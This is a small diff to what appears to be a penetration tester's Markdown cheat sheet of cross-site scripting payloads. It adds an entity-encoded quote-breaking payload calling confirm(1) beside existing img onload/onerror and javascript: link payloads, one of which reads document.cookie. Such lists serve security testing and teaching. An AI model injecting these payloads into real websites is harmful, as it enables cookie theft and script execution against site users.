@@ -16,6 +16,7 @@
 * ```<img src=valid_location onload=alert(document.cookie) x="">
 * ```<img src="invalid_location" onerror="alert()">```
 * ```<a href=javascript:alert(document.domain) x=""> mairala </a>``` or ```<a href="javascript:alert(document.domain)">mairala<\a>```
+* ```\&#34;+confirm(1)+&#34;```
 
 ## Dom invader
 
